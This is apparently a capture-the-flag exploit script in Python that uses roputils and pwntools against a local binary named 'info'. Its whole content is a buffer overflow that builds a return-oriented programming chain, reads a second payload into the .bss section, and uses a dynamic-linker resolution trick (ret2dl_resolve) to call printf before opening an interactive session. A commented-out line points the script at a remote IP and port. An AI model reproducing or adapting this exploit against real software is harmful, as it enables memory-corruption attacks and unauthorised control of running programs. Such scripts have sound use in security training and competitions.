from roputils import *
import pwn
pwn.context(log_level="debug")
fpath = "./info"
offset = 0x16

rop = ROP(fpath)
# print rop.fpath
# p = Proc(rop.fpath)
p = pwn.process(rop.fpath)
# p = pwn.remote("123.206.81.66",8888)
pwn.gdb.attach(p,"b*0x80484DC\nb*0x080484E5\n\nc")

addr_bss = rop.section('.bss')+0x50

# buf = rop.retfill(offset)
buf = 'a'*offset
buf += rop.call('read', 0, addr_bss, 0x100)
buf += rop.dl_resolve_call(addr_bss+0x30, addr_bss,0x0804864B)#
buf += rop.call('fflush', 0x8049844)
buf += (0x7f-len(buf))*'a'


buf2 = rop.string("[Result]:0x%X")
# buf2 = p32(0)*12
buf2 += (0x30-len(buf2))*'b'

buf2 += rop.dl_resolve_data(addr_bss+0x30, 'printf')
buf2 += (0x100-len(buf2))*'a'
p.send(buf+buf2)


p.interactive()
